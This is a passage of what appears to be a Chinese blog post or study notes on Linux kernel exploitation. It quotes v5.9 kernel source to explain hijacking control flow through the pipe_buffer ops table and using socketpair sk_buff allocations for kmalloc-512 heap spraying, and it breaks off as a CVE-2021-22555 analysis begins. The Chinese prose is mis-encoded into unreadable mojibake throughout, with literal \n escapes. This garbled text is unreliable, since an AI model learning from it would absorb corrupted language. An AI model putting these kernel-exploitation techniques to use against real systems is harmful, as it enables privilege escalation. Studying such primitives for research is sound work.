¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º\n\n```C\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buf_operations {\n\tint (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tvoid (*release)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*get)(struct pipe_inode_info *, struct pipe_buffer *);\n};\n```\n\n#### â‘¡åŠ«æŒç¨‹åºæµ\n\nå½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°`free_pipe_info`å‡½æ•°ï¼Œåœ¨æ¸…ç†`pipe_buffer`æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š\n\n```c\nif (buf->ops)\n    pipe_buf_release(pipe, buf);\n```\n\nå½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨`write`å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®\n\n```c\n//v5.9 /fs/pipe.c\nstatic ssize_t\n    pipe_write(struct kiocb *iocb, struct iov_iter *from)\n{\n    //......\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //......\n    buf = &pipe->bufs[head & mask];\n    buf->page = page;\n    buf->ops = &anon_pipe_buf_ops;\n    buf->offset = 0;\n    buf->len = 0;\n    //......\n\n}\n```\n\nç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨`read`å¯¹åº”çš„`pipe_read`å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ\n\n```c\n//v5.9  /fs/pipe.c\nstatic ssize_t\n    pipe_read(struct kiocb *iocb, struct iov_iter *to)\n{\n    //....\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //....\n    if (!buf->len) {\n        pipe_buf_release(pipe, buf);\n        //....\n    }\n    //....\n}\n```\n\nä»è€Œè°ƒç”¨`pipe_buf_release`å°†`buf->ops`æ¸…ç©ºã€‚\n\nğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†`pipe_buf_release`å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡`read`å°†ç®¡é“`pipe`ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥`release`å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰\n\né‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨\n\n![image-20220509192251738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png)\n\nè€Œå½“`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„`pipe_buf_release`å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª`buf->ops`å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„`relase`å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„`pipe_buf_operations`ç»“æ„ä¸­æœ‰æåˆ°\n\n![image-20220509193945468](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png)\n\né‚£ä¹ˆå¦‚æœåŠ«æŒäº†`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°`release`å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚\n\nä¸è¿‡`pipe`ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬`bsauce`è¯´æ˜¯åœ¨`struct pipe_buffer`ç»“æ„ä¸‹`buf`çš„`page`é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„`kmalloc`å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„`sk_buff`æœ‰ç‚¹ä¸åŒã€‚\n\n## 3.sk_buff---kmalloc-512åŠä»¥ä¸Š\n\nå‚è€ƒï¼š[(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair](https://blog.csdn.net/weixin_40039738/article/details/81095013)\n\nå’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª`socketpair`ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯`socket`ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ`pipe`éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š\n\n- æ•°æ®ä¼ è¾“æ¨¡å¼\n  - `pipe`ï¼šå•å·¥ï¼Œå‘é€ç«¯`fd[1]`å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯`fd[0]`æ¥æ”¶æ•°æ®\n  - `socketpair`ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚\n- æ¨¡å¼\n  - `pipe`ï¼šç”±`flag`æ¥å®šä¹‰ä¸åŒæ¨¡å¼\n  - `socketpair`ï¼šé»˜è®¤é˜»å¡çŠ¶æ€\n\næ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ`pipe()`å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹`socketpair`çš„è°ƒç”¨ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n```c\n#include <sys/socket.h>\n\n//é»˜è®¤å¿…é¡»\nint socket_fd[2];\n//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„\nint sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, 0, socket_fd);\nif( sockPair_return < 0){\n    perror( \"socketpair()\" );\n    exit(1);\n}\n```\n\nç„¶åå’Œ`pipe`ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨`write/read`å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(socket_fd[0],msg,0x8);\nread(socket_fd[1],buf,0x8);\n```\n\n#### â‘¡é‡Šæ”¾\n\n```c\nclose(socket_fd[0]);\nclose(socket_fd[1]);\n```\n\nå¯ä»¥çœ‹åˆ°å’Œ`pipe`æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\nåœ¨è°ƒç”¨`socketpair`è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨`write`æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚\n\n#### â‘ åˆ†é…\n\nåœ¨è°ƒç”¨`write`è¿›è¡Œæ•°æ®å†™å…¥æ—¶\n\nå‡½æ•°é“¾ï¼š\n\n```c\nwrite -> ksys_write() -> vfs_write() -> new_sync_write() -> call_write_iter() -> sock_write_iter() -> sock_sendmsg() -> sock_sendmsg_nosec() -> unix_stream_sendmsg()->å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶\n```\n\nåœ¨`unix_stream_sendmsg`å¼€å§‹åˆ†å‰\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg,\n\t\t\t       size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct sock *other = NULL;\n\tint err, size;\n\tstruct sk_buff *skb;\n\tint sent = 0;\n\tstruct scm_cookie scm;\n\tbool fds_sent = false;\n\tint data_len;\n\t//.....\n\twhile (sent < len) {\n\t\tsize = len - sent;\n\t\t/* Keep two messages in the pipe so it schedules better */\n\t\tsize = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);\n\t\t/* allow fallback to order-0 allocations */\n\t\tsize = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);\n\t\tdata_len = max_t(int, 0, size - SKB_MAX_HEAD(0));\n\t\tdata_len = min_t(size_t, size, PAGE_ALIGN(data_len));\n        //------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†\n\t\tskb = sock_alloc_send_pskb(sk, size - data_len, data_len,\n\t\t\t\t\t   msg->msg_flags & MSG_DONTWAIT, &err,\n\t\t\t\t\t   get_order(UNIX_SKB_FRAGS_SZ));\n        //ç›¸å…³æ£€æŸ¥éƒ¨åˆ†\n\t\tif (!skb)\n\t\t\tgoto out_err;\n\t\t/* Only send the fds in the first buffer */\n\t\terr = unix_scm_to_skb(&scm, skb, !fds_sent);\n\t\tif (err < 0) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n\t\t//.....\n        //----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†\n\t\tskb_put(skb, size - data_len);\n\t\tskb->data_len = data_len;\n\t\tskb->len = size;\n        //è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶\n\t\terr = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, size);\n\t\tif (err) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n        //.....\n\t\tsent += size;\n\t}\n\t//......\n\n\treturn sent;\nout_err:\n\tscm_destroy(&scm);\n\treturn sent ? : err;\n}\n```\n\n##### A.å†…å­˜ç”³è¯·\n\nå…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³`sock_alloc_send_pskb() -> alloc_skb_with_frags() -> alloc_skb() -> __alloc_skb()`\n\nè¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„`__alloc_skb`å‡½æ•°ï¼Œ\n\n```c\n//v5.9 /net/core/skbuff.c\nstruct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,\n\t\t\t    int flags, int node)\n{\n\tstruct kmem_cache *cache;\n\tstruct skb_shared_info *shinfo;\n\tstruct sk_buff *skb;\n\tu8 *data;\n\tbool pfmemalloc;\n\n\tcache = (flags & SKB_ALLOC_FCLONE)\n\t\t? skbuff_fclone_cache : skbuff_head_cache;\n\n\tif (sk_memalloc_socks() && (flags & SKB_ALLOC_RX))\n\t\tgfp_mask |= __GFP_MEMALLOC;\n\n\t/* Get the HEAD */\n    //ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜\n    //ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„\n\tskb = kmem_cache_alloc_node(cache, gfp_mask & ~__GFP_DMA, node);\n\tif (!skb)\n\t\tgoto out;\n\t//......\n    //å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½\n\tsize = SKB_DATA_ALIGN(size);\n    //size += å¯¹é½ä¹‹åçš„0x140\n    //é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512\n\tsize += SKB_DATA_ALIGN(sizeof(struct skb_shared_info));\n    \n    //è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼\n    //è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…\n    //è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—\n    //å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°\n    //åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶\n\tdata = kmalloc_reserve(size, gfp_mask, node, &pfmemalloc);\n\tif (!data)\n\t\tgoto nodata;\n\t//...\n\tsize = SKB_WITH_OVERHEAD(ksize(data));\n\t//....\n    //åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„\n\tmemset(skb, 0, offsetof(struct sk_buff, tail));\n\t/* Account for allocated memory : skb + skb->head */\n\tskb->truesize = SKB_TRUESIZE(size);\n\tskb->pfmemalloc = pfmemalloc;\n\trefcount_set(&skb->users, 1);\n\tskb->head = data;\n\tskb->data = data;\n\tskb_reset_tail_pointer(skb);\n\tskb->end = skb->tail + size;\n\tskb->mac_header = (typeof(skb->mac_header))~0U;\n\tskb->transport_header = (typeof(skb->transport_header))~0U;\n\t//...\nout:\n\treturn skb;\nnodata:\n\tkmem_cache_free(cache, skb);\n\tskb = NULL;\n\tgoto out;\n}\n```\n\n###### å†…å­˜ç”³è¯·æ€»ç»“ï¼š\n\n- `sk_buff`ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± `skbuff_fclone_cache/skbuff_head_cache`ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶\n- `skb->data`ä¸ºå®é™…çš„æ•°æ®ç»“æ„\n  - `size`ï¼š`0x140+n*0x40`(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚\n  - å †å—ç”³è¯·ï¼šèµ°`kmalloc`è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚\n- æ¯è°ƒç”¨`wirte`å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„`sk_buff`å’Œ`skb->data`ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚\n\n##### B.æ•°æ®å¤åˆ¶\n\nç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°`unix_stream_sendmsg`å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶`skb_copy_datagram_from_iter`ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚\n\n```c\n//v5.9 /net/core/datagram.c\nint skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,\n                                struct iov_iter *from,\n                                int len)\n{\n    int start = skb_headlen(skb);\t\t\t// skb->len - skb->data_len;\n    int i, copy = start - offset;\t\t\t// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°\n    struct sk_buff *frag_iter;\n    //æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb->data\n    if (copy > 0) {\n        if (copy > len)\n            copy = len;\n        if (copy_from_iter(skb->data + offset, copy, from) != copy)\n            goto fault;\n        if ((len -= copy) == 0)\n            return 0;\n        offset += copy;\n    }\n    //....\n}\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nå½“ä»`socker`å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”`sk_buff`å’Œ`skb->data`çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚\n\nåœ¨`read`æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š\n\n```\nread -> ksys_read() -> vfs_read() -> new_sync_read() -> call_read_iter() -> sock_read_iter() -> sock_recvmsg() -> sock_recvmsg_nosec() -> unix_stream_recvmsg() -> unix_stream_read_generic()\n```\n\nåŒæ ·çš„åœ¨`unix_stream_read_generic`å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_read_generic(struct unix_stream_read_state *state,\n\t\t\t\t    bool freezable)\n{\n    //....\n\tdo {\n        //....\n\t\tchunk = min_t(unsigned int, unix_skb_len(skb) - skip, size);\n\t\tskb_get(skb);\n        //------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶\n        //recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨\n        //è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶\n\t\tchunk = state->recv_actor(skb, skip, chunk, state);\n        //...\n        //ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb->usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­\n        //æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®\n\t\tconsume_skb(skb);\n\t\tif (chunk < 0) {\n\t\t\tif (copied == 0)\n\t\t\t\tcopied = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tcopied += chunk;\n\t\tsize -= chunk;\n\n\t\t/* Mark read part of skb as used */\n\t\tif (!(flags & MSG_PEEK)) {\n            //ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb->cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®\n            //#define UNIXCB(skb)\t(*(struct unix_skb_parms *)&((skb)->cb))\n\t\t\tUNIXCB(skb).consumed += chunk;\n\t\t\t//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®\n            //æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ\n\t\t\tif (unix_skb_len(skb))\n\t\t\t\tbreak;\n            //------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾\n            //å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ\n\t\t\tskb_unlink(skb, &sk->sk_receive_queue);\n            //è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb->usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ\n\t\t\tconsume_skb(skb);\n            //....................\n\t} while (size);\n        //......................\nout:\n\treturn copied ? : err;\n}\n```\n\n##### A.æ•°æ®å¤åˆ¶\n\nä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º\n\n```\nunix_stream_read_actor() -> skb_copy_datagram_msg() -> skb_copy_datagram_iter() -> __skb_datagram_iter()\n```\n\næœ€ç»ˆè¿›å…¥`__skb_datagram_iter`ï¼Œ\n\n```c\n//v5.9 /net/core/datagram.c\nstatic int __skb_datagram_iter(const struct sk_buff *skb, int offset,\n\t\t\t       struct iov_iter *to, int len, bool fault_short,\n\t\t\t       size_t (*cb)(const void *, size_t, void *,\n\t\t\t\t\t    struct iov_iter *), void *data)\n{\n\tint start = skb_headlen(skb);\n\tint i, copy = start - offset, start_off = offset, n;\n\tstruct sk_buff *frag_iter;\n\n\t/* Copy header. */\n    //è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®\n\tif (copy > 0) {\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\t\tn = INDIRECT_CALL_1(cb, simple_copy_to_iter,\n\t\t\t\t    skb->data + offset, copy, data, to);\n\t\toffset += n;\n\t\tif (n != copy)\n\t\t\tgoto short_copy;\n\t\tif ((len -= copy) == 0)\n\t\t\treturn 0;\n\t}\n    //......\n    /* Copy paged appendix. Hmm... why does this look so complicated? */\n    //linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs\n    //......\n}\n```\n\nè¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚\n\n##### B.å†…å­˜é‡Šæ”¾\n\nè¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º\n\n- é‡Šæ”¾`skb->data`éƒ¨åˆ†ï¼š\n\n  ```\n  consume_skb()->__kfree_skb()->skb_release_all()->skb_release_all()->skb_release_data()->skb_free_head()\n  ```\n\n  å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void skb_free_head(struct sk_buff *skb)\n  {\n      //å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„\n  \tunsigned char *head = skb->head;\n  \tif (skb->head_frag) {\n  \t\tif (skb_pp_recycle(skb, head))\n  \t\t\treturn;\n  \t\tskb_free_frag(head);\n  \t} else {\n  \t\tkfree(head);\n  \t}\n  }\n  ```\n\n  å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„`kfree`å‡½æ•°\n\n- é‡Šæ”¾`skb`éƒ¨åˆ†ï¼š\n\n  ```\n  consume_skb()->__kfree_skb()->kfree_skbmem()\n  ```\n\n  ç›¸å…³å‡½æ•°å¦‚ä¸‹\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void kfree_skbmem(struct sk_buff *skb)\n  {\n      struct sk_buff_fclones *fclones;\n      //å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„\n      switch (skb->fclone) {\n          case SKB_FCLONE_UNAVAILABLE:\n              //ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶\n              kmem_cache_free(skbuff_head_cache, skb);\n              return;\n  \n          case SKB_FCLONE_ORIG:\n              fclones = container_of(skb, struct sk_buff_fclones, skb1);\n  \n              /* We usually free the clone (TX completion) before original skb\n  \t\t * This test would have no chance to be true for the clone,\n  \t\t * while here, branch prediction will be good.\n  \t\t */\n              if (refcount_read(&fclones->fclone_ref) == 1)\n                  goto fastpath;\n              break;\n  \n          default: /* SKB_FCLONE_CLONE */\n              fclones = container_of(skb, struct sk_buff_fclones, skb2);\n              break;\n      }\n      if (!refcount_dec_and_test(&fclones->fclone_ref))\n          return;\n  fastpath:\n      //ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb\n      kmem_cache_free(skbuff_fclone_cache, fclones);\n  }\n  \n  ```\n\n  è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚\n\n  åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„`sk_buff`å’Œ`skb->data`éƒ½ä¼šå¾—åˆ°é‡Šæ”¾\n\n##### å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š\n\n- å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„`sk_buff`å’Œ`skb->data`çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”`sk_buff`é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ`skb->data`ä½¿ç”¨æ­£å¸¸çš„`kfree`é‡Šæ”¾\n\n- å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„`sk_buff`å’Œ`skb->data`éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š\n\n  ```\n  sock_close()->__sock_release()->unix_release()->__kfree_skb()\n  ```\n\n  åé¢å°±ç±»ä¼¼äº†ã€‚\n\n# ä¸€ã€æ¼æ´åˆ†æ\n\n## å‰è¨€\n\nç”±äºæˆ‘ç¼–è¯‘ç¯å¢ƒçš„æ—¶å€™è€æ˜¯å‡ºé—®é¢˜ï¼ˆåé¢æ‰è§£å†³çš„ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿`bsauce`å¸ˆå‚…æä¾›çš„ç¯å¢ƒæ¥ç”¨äº†ï¼Œä½†æ˜¯åˆæ²¡æœ‰å¸¦DEBUGçš„`vmlinux`ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf.git)ç®€å•è·å–ä¸‹ç¬¦å·å°±å¼€å§‹é€†å‘äº†(xs)ï¼Œæ‰€ä»¥ä¸‹é¢æ¼æ´åˆ†ææåˆ°çš„åœ°å€ä¸º`bsauce`å¸ˆå‚…ç¯å¢ƒçš„åœ°å€ã€‚\n\n[CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° 